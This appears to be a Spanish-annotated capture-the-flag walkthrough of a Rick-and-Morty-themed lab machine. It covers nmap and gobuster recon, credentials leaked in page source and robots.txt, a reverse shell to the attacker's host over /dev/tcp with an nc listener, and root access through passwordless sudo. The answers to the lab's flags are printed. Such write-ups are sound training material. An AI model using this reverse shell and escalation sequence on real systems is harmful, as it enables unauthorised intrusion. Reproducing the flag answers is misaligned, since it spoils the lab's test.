### Recon

```
nmap -sV -n -Pn 10.10.164.67                         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-05 19:13 CDT
Nmap scan report for 10.10.164.67
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.92 seconds

```

```
curl -I http://10.10.164.67/
HTTP/1.1 200 OK
Date: Sun, 06 Oct 2024 00:15:09 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Sun, 10 Feb 2019 16:37:33 GMT
ETag: "426-5818ccf125686"
Accept-Ranges: bytes
Content-Length: 1062
Vary: Accept-Encoding
Content-Type: text/html

```

```
curl http://10.10.164.67/robots.txt
Wubbalubbadubdub

```

- en el codigo fuente

```

<!--
    Note to self, remember username!
    Username: R1ckRul3s
  -->
```


#### What is the first ingredient that Rick needs?  
```
gobuster dir -u http://10.10.226.247/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 150 -x .php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.226.247/
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://10.10.226.247/assets/]
/login.php            (Status: 200) [Size: 882]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
Progress: 4224 / 163288 (2.59%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 4467 / 163288 (2.74%)
===============================================================
Finished
===============================================================

```


http://10.10.226.247/portal.php

```
R1ckRul3s
Wubbalubbadubdub
```

```
ls -la

total 40
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt

les clue.txt
Look around the file system for the other ingredient.

less Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair

```


#### What is the second ingredient in Rick’s potion?  

```

ping -c1 10.2.4.107


sudo tcpdump icmp -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
19:47:48.616402 IP 10.10.226.247 > 10.2.4.107: ICMP echo request, id 1, seq 1, length 64
19:47:48.616448 IP 10.2.4.107 > 10.10.226.247: ICMP echo reply, id 1, seq 1, length 64

```

```
echo "sh -i >& /dev/tcp/10.2.4.107/7789 0>&1" > /tmp/shell.bash

chmod +x /tmp/shell.bash

bash  /tmp/shell.bash


rlwrap nc -lnvp 7789     
listening on [any] 7789 ...
connect to [10.2.4.107] from (UNKNOWN) [10.10.226.247] 47888
sh: 0: can't access tty; job control turned off
$ 


$ cd /home
$ ls
rick
ubuntu
$ cd rick
$ ls
second ingredients
$ ls -la
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
$ cat 'second ingredients'
1 jerry tear
$ pwd
/home/rick


```


#### What is the last and final ingredient?

```
$ sudo -l
Matching Defaults entries for www-data on ip-10-10-226-247:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-226-247:
    (ALL) NOPASSWD: ALL
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ sudo su -

id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
3rd.txt
snap
cat 3rd.txt
3rd ingredients: fleeb juice


```